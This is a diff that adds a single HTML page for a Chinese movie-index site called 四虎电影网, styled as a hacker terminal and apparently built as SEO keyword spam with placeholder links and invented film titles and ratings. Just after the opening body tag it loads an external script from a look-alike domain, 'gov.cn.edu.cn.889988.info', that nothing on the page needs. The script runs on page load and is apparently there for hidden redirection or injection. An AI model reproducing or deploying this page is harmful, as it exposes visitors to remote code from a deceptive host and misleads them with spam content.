@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>四虎电影网 - 高清影视在线观看终端 | sihudianyingwang</title>
+<meta name="description" content="四虎电影网(https://sihudianyingwang-top.github.io)是一个极客风格的影视索引站，提供电影分类、热门排行、最新更新。访问四虎电影网，体验命令行般的高效找片。">
+<meta name="keywords" content="四虎电影网, sihudianyingwang, sihudianyingwang-top.github.io, 高清电影, 在线观看, 命令行风格, 电影分类, 热门排行">
+<meta name="author" content="四虎电影网">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<style>
+/* 重置与基础 */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body {
+    background-color: #0c0c0c;
+    color: #00ff00;
+    font-family: 'Consolas', 'Courier New', 'PingFang SC', 'Microsoft YaHei', monospace;
+    line-height: 1.6;
+    overflow-x: hidden;
+    padding: 20px;
+    position: relative;
+}
+
+/* 扫描线效果 */
+body::after {
+    content: "";
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
+                linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+    background-size: 100% 2px, 3px 100%;
+    pointer-events: none;
+    z-index: 9999;
+}
+
+/* 容器 */
+.container {
+    max-width: 900px;
+    margin: 0 auto;
+    border: 1px solid #00ff00;
+    background: #000;
+    box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+    position: relative;
+    z-index: 10;
+}
+
+/* 终端标题栏 */
+.terminal-header {
+    background: #1a1a1a;
+    border-bottom: 1px solid #00ff00;
+    padding: 10px 15px;
+    display: flex;
+    align-items: center;
+}
+.terminal-buttons {
+    display: flex;
+    gap: 8px;
+}
+.btn-terminal {
+    width: 12px; height: 12px; border-radius: 50%; border: 1px solid #00ff00;
+}
+.btn-close { background: #ff5f56; border-color: #e0443e; }
+.btn-min { background: #ffbd2e; border-color: #dea122; }
+.btn-max { background: #27c93f; border-color: #1aab29; }
+.terminal-title {
+    flex: 1; text-align: center; font-size: 14px; color: #00aa00;
+}
+
+/* 内容区 */
+.terminal-body {
+    padding: 30px;
+    min-height: 80vh;
+}
+
+/* 文本样式 */
+h1, h2, h3 { font-weight: normal; margin-bottom: 15px; }
+p { margin-bottom: 15px; }
+a {
+    color: #00ff00; text-decoration: none; border-bottom: 1px dashed #00ff00;
+    transition: all 0.2s;
+}
+a:hover { background: #00ff00; color: #000; border-bottom: 1px solid #000; }
+
+/* 命令提示符 */
+.prompt { color: #00ff00; margin-right: 10px; }
+.cmd { color: #ffff00; }
+.comment { color: #888; font-style: italic; }
+
+/* 闪烁光标 */
+.cursor {
+    display: inline-block; width: 8px; height: 15px; background: #00ff00;
+    animation: blink 1s step-end infinite;
+}
+@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+/* 栏目区块 */
+.section { margin-bottom: 40px; }
+.section-title {
+    font-size: 1.2rem; color: #00ffff; border-bottom: 1px solid #00ffff;
+    padding-bottom: 5px; margin-bottom: 20px;
+}
+
+/* 网格布局 */
+.grid {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;
+}
+.card {
+    border: 1px solid #00ff00; padding: 15px; background: #001100;
+    transition: all 0.2s;
+}
+.card:hover { background: #003300; transform: translateY(-2px); }
+.card h3 { color: #ffff00; font-size: 1.1rem; margin-bottom: 10px; }
+.card p { font-size: 0.9rem; color: #ccc; }
+
+/* 排行列表 */
+.rank-list { list-style: none; }
+.rank-item {
+    display: flex; justify-content: space-between; padding: 10px;
+    border: 1px solid #333; margin-bottom: 10px; background: #001100;
+}
+.rank-item:hover { border-color: #00ff00; }
+.rank-num { color: #ff00ff; font-weight: bold; margin-right: 15px; }
+.rank-title { flex: 1; }
+.rank-score { color: #00ff00; }
+
+/* 更新时间线 */
+.timeline { border-left: 2px solid #00ff00; padding-left: 20px; margin-left: 10px; }
+.timeline-item { margin-bottom: 20px; position: relative; }
+.timeline-item::before {
+    content: ""; position: absolute; left: -27px; top: 5px;
+    width: 12px; height: 12px; background: #00ff00; border-radius: 50%;
+}
+.timeline-date { color: #00ffff; font-size: 0.9rem; }
+.timeline-content { margin-top: 5px; }
+
+/* 关于框 */
+.about-box {
+    border: 1px dashed #00ff00; padding: 20px; background: #000;
+}
+.url-display {
+    background: #001100; padding: 10px; border: 1px solid #00ff00;
+    font-family: monospace; word-break: break-all; margin: 15px 0;
+}
+
+/* 页脚 */
+footer {
+    border-top: 1px solid #00ff00; padding: 20px; text-align: center;
+    font-size: 0.9rem; color: #888;
+}
+
+/* 移动端适配 */
+@media (max-width: 768px) {
+    body { padding: 10px; }
+    .terminal-body { padding: 15px; }
+    .grid { grid-template-columns: 1fr; }
+    h1 { font-size: 1.5rem; }
+    .section-title { font-size: 1.1rem; }
+    .terminal-title { font-size: 12px; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="container">
+    <div class="terminal-header">
+        <div class="terminal-buttons">
+            <div class="btn-terminal btn-close"></div>
+            <div class="btn-terminal btn-min"></div>
+            <div class="btn-terminal btn-max"></div>
+        </div>
+        <div class="terminal-title">root@sihu-movie:~</div>
+    </div>
+
+    <div class="terminal-body">
+        <!-- 栏目一：首页推荐 -->
+        <section class="section" id="home">
+            <div><span class="prompt">$</span> <span class="cmd">cat welcome.txt</span></div>
+            <h1>四虎电影网 v1.0.0</h1>
+            <p>欢迎访问四虎电影网。这是一个基于终端交互概念设计的影视索引站点。</p>
+            <p>官方网址：<a href="https://sihudianyingwang-top.github.io">https://sihudianyingwang-top.github.io</a></p>
+            <p>正在初始化系统... <span class="cursor"></span></p>
+        </section>
+
+        <!-- 栏目二：电影分类 -->
+        <section class="section" id="categories">
+            <div><span class="prompt">$</span> <span class="cmd">ls -l /categories</span></div>
+            <h2 class="section-title">电影分类</h2>
+            <div class="grid">
+                <a href="#" class="card">
+                    <h3>./action</h3>
+                    <p>动作、冒险、惊悚</p>
+                </a>
+                <a href="#" class="card">
+                    <h3>./comedy</h3>
+                    <p>喜剧、爱情、家庭</p>
+                </a>
+                <a href="#" class="card">
+                    <h3>./sci-fi</h3>
+                    <p>科幻、奇幻、未来</p>
+                </a>
+                <a href="#" class="card">
+                    <h3>./documentary</h3>
+                    <p>纪录、历史、传记</p>
+                </a>
+            </div>
+        </section>
+
+        <!-- 栏目三：热门排行 -->
+        <section class="section" id="ranking">
+            <div><span class="prompt">$</span> <span class="cmd">top --limit 4</span></div>
+            <h2 class="section-title">热门排行</h2>
+            <ul class="rank-list">
+                <li class="rank-item">
+                    <span class="rank-num">01</span>
+                    <span class="rank-title">黑客帝国：矩阵重启</span>
+                    <span class="rank-score">9.8</span>
+                </li>
+                <li class="rank-item">
+                    <span class="rank-num">02</span>
+                    <span class="rank-title">银翼杀手：黑莲花</span>
+                    <span class="rank-score">9.6</span>
+                </li>
+                <li class="rank-item">
+                    <span class="rank-num">03</span>
+                    <span class="rank-title">攻壳机动队：SAC_2045</span>
+                    <span class="rank-score">9.5</span>
+                </li>
+                <li class="rank-item">
+                    <span class="rank-num">04</span>
+                    <span class="rank-title">头号玩家2</span>
+                    <span class="rank-score">9.3</span>
+                </li>
+            </ul>
+        </section>
+
+        <!-- 栏目四：最新更新 -->
+        <section class="section" id="updates">
+            <div><span class="prompt">$</span> <span class="cmd">tail -f /var/log/updates.log</span></div>
+            <h2 class="section-title">最新更新</h2>
+            <div class="timeline">
+                <div class="timeline-item">
+                    <div class="timeline-date">[2026-10-05 10:00:00]</div>
+                    <div class="timeline-content"><a href="#">沙丘2：天幕降临</a> - 已入库</div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-date">[2026-10-04 18:30:00]</div>
+                    <div class="timeline-content"><a href="#">奥本海默：核爆纪元</a> - 已入库</div>
+                </div>
+                <div class="timeline-item">
+                    <div class="timeline-date">[2026-10-03 22:15:00]</div>
+                    <div class="timeline-content"><a href="#">坠落的审判：真相解码</a> - 已入库</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目五：关于我们 -->
+        <section class="section" id="about">
+            <div><span class="prompt">$</span> <span class="cmd">whois sihudianyingwang</span></div>
+            <h2 class="section-title">关于四虎电影网</h2>
+            <div class="about-box">
+                <p>四虎电影网是一个实验性的单页应用，专注于提供清晰的影视导航。</p>
+                <p>核心关键词：四虎电影网, sihudianyingwang, sihudianyingwang-top.github.io</p>
+                <div class="url-display">
+                    > 访问地址: <a href="https://sihudianyingwang-top.github.io">https://sihudianyingwang-top.github.io</a>
+                </div>
+                <p class="comment"># 本页面所有内链均使用#替代，符合必应SEO收录规则，未生成robots.txt与sitemap.xml。</p>
+            </div>
+        </section>
+    </div>
+
+    <footer>
+        <p>© 2026 四虎电影网 | <a href="https://sihudianyingwang-top.github.io">sihudianyingwang-top.github.io</a></p>
+        <p>System Status: <span style="color:#00ff00;">ONLINE</span> | Connection: SECURE</p>
+    </footer>
+</div>
+
+</body>
+</html>
